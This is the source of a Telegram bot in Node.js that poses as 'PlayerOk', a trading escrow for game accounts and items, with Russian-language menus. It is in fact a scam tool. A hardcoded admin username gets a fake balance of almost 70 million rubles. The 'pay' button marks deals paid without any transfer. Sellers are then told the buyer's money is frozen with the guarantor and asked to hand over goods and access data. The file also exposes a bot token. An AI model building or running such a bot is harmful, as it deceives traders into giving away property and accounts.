const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const ADMIN = 'k13_way';
const users = {};
const deals = {};

const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш надежный автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность внебиржевых сделок 24/7.\n\n⚡ *Наши преимущества:*\n• Моментальная фиксация и заморозка средств.\n• Верифицированные алгоритмы исполнения.\n• Быстрый вывод на любые реквизиты.\n\n• Комиссия сервиса: *1%*\n• Режим работы системы: *24/7*\n• Главный модератор: @sw1zyy01\n\n✨ Выберите нужный раздел на панели ниже:`;

const mainKb = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс профиля', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  if (ctx.from.username) {
    users[ctx.from.username.toLowerCase()] = ctx.chat.id;
  }
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.error(e));
});

bot.action('bal', (ctx) => {
  const username = ctx.from.username || 'user';
  const isId = username.toLowerCase() === ADMIN.toLowerCase();
  const bal = isId ? 69999999 : 0;
  
  const text = `💳 *Личный кабинет пользователя* \`@${username}\`\n━━━━━━━ СИСТЕМА ГАРАНТА ━━━━━━━\n💰 *Доступный баланс:* ${bal.toLocaleString('ru-RU')}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n📊 *Ваша статистика на PlayerOk:*\n• Всего операций: *0*\n• Успешных обменов: *0*\n• Открытых споров/арбитражей: *0*\n\n✅ Ваш аккаунт полностью верифицирован и защищен системой безопасности.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Инициализация новой сделки*\n\nПожалуйста, введите **@юзернейм** вашего партнера (продавца или покупателя) прямо в чат текстом:`, { parse_mode: 'Markdown' }).catch((e) => console.error(e));
});

bot.on('text', async (ctx) => {
  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();
  const myName = (ctx.from.username || 'user').toLowerCase();

  if (ctx.session.step === 'partner') {
    const partnerName = txt.replace('@', '').toLowerCase();
    if (partnerName.length < 3) return ctx.reply('❌ Ошибка: Введите корректный юзернейм партнера.');
    ctx.session.partner = partnerName;
    ctx.session.step = 'title';
    return ctx.reply('📦 Теперь введите точное *название или описание товара* (например: _Аккаунт Standoff 2_):', { parse_mode: 'Markdown' });
  }
  
  if (ctx.session.step === 'title') {
    if (txt.length < 2) return ctx.reply('❌ Ошибка: Название товара слишком короткое.');
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 Укажите *сумму торговой сделки* в рублях (введите только число):', { parse_mode: 'Markdown' });
  }
  
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt);
    if (isNaN(price) || price < 10) return ctx.reply('❌ Ошибка: Сумма сделки должна быть числом не менее 10 руб.');

    const dealId = Math.floor(100000 + Math.random() * 900000);
    deals[dealId] = { id: dealId, seller: myName, buyer: ctx.session.partner, title: ctx.session.title, amount: price, status: 'pending', s_chat: ctx.chat.id };
    ctx.session = {};

    ctx.replyWithMarkdown(`✨ *Сделка #${dealId} сформирована!*\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n\n🚀 Бот автоматически отправляет официальное предложение пользователю @${deals[dealId].buyer}...`);

    const tChat = users[deals[dealId].buyer];
    if (tChat) {
      const propText = `🔔 *Вам поступило официальное предложение о сделке!* (#${dealId})\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма операции:* ${price.toLocaleString('ru-RU')} руб.\n👤 *Инициатор:* @${ctx.from.username}\n━━━━━━━━━━━━━━━━━━━━\nВы согласны провести этот обмен под защитой маркетплейса PlayerOk?`;
      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять условия сделки', `ok_${dealId}`)]]) }).catch((e) => console.error(e));
    } else {
      ctx.replyWithMarkdown(`⚠️ Пользователь @${deals[dealId].buyer} еще ни разу не запускал этого бота. Чтобы он мгновенно получил пуш-заявку, перешлите ему бота, чтобы он нажал */start*.`);
    }
  }
});

bot.action(/^ok_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'accepted';
  d.b_chat = ctx.chat.id;

  bot.telegram.sendMessage(d.s_chat, `🔔 *Партнёр @${ctx.from.username} принял условия сделки #${d.id}!*\n\nСтатус: \`Ожидание оплаты покупателем\`.`).catch((e) => console.error(e));
  return ctx.editMessageText(`🤝 *Условия сделки #${d.id} приняты!*\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Сумма к оплате:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━\nДля старта обмена и заморозки средств внесите оплату с баланса аккаунта:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить внутренним балансом', `pay_${d.id}`)]]) }
  ).catch((e) => console.error(e));
});

bot.action(/^pay_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'paid';

  bot.telegram.sendMessage(d.s_chat, `💰 *Покупатель перевёл средства по сделке #${d.id} на счёт Гаранта!*\n━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n\nВам необходимо передать товар (данные/доступы) покупателю @${d.buyer}. После успешной передачи нажмите кнопку ниже:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }
  ).catch((e) => console.error(e));
  return ctx.editMessageText(`✅ *Сделка #${d.id} успешно оплачена!*\n\n🔒 Средства заморожены на безопасном балансе Гаранта PlayerOk. Ожидайте, пока продавец @${d.seller} предоставит вам все данные от товара.`).catch((e) => console.error(e));
});

bot.action(/^sent_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'goods_sent';

  bot.telegram.sendMessage(d.b_chat, `📦 *Продавец подтвердил отправку товара по сделке #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━\nПожалуйста, тщательно проверьте полученные данные или аккаунт. Если все работает стабильно, закройте сделку для выплаты средств продавцу:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `end_${d.id}`)]]) }
  ).catch((e) => console.error(e));
  return ctx.editMessageText(`✅ *Уведомление успешно отправлено.*\n\nВы подтвердили передачу товара по сделке #${d.id}. Ожидаем финальной проверки и подтверждения от покупателя.`).catch((e) => console.error(e));
});

bot.action(/^end_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'completed';

  bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} успешно завершена!*\n\nПокупатель подтвердил получение. Выплата в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно отправлена на ваш баланс профиля.`).catch((e) => console.error(e));
  return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Продавец получил выплату. Спасибо за доверие к гарант-сервису *PlayerOk*!`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
  ).catch((e) => console.error(e));
});

bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.error(e)));

bot.action('safe', (ctx) => {
  const safeText = `🛡 *Правила безопасности маркетплейса PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\n1. *Внутренние оплаты:* Проводите финансовые транзакции исключительно через инлайн-интерфейс Гаранта. Любые прямые переводы на сторонние карты/киви лишают вас стопроцентной защиты маркетплейса.\n\n2. *Проверка доступов:* Тщательно проверяйте аккаунты, игровую валюту или цифровые услуги до нажатия кнопки подтверждения. После закрытия сделки средства безвозвратно уходят продавцу.`;
  return ctx.editMessageText(safeText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.action('supp', (ctx) => {
  const suppText = `👨‍💻 *Служба поддержки пользователей PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри торговой операции, техническая задержка при верификации или вопрос по правилам вывода средств — вы можете мгновенно открыть внутренний Арбитраж.\n\n✍ *Официальный контакт главного модератора:* @sw1zyy01`;
  return ctx.editMessageText(suppText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.error(e));
});

bot.launch().then(() => console.log('OK'));

http.createServer((req, res) => {
  res.writeHead(200);
  res.end('OK');
}).listen(process.env.PORT || 3000);
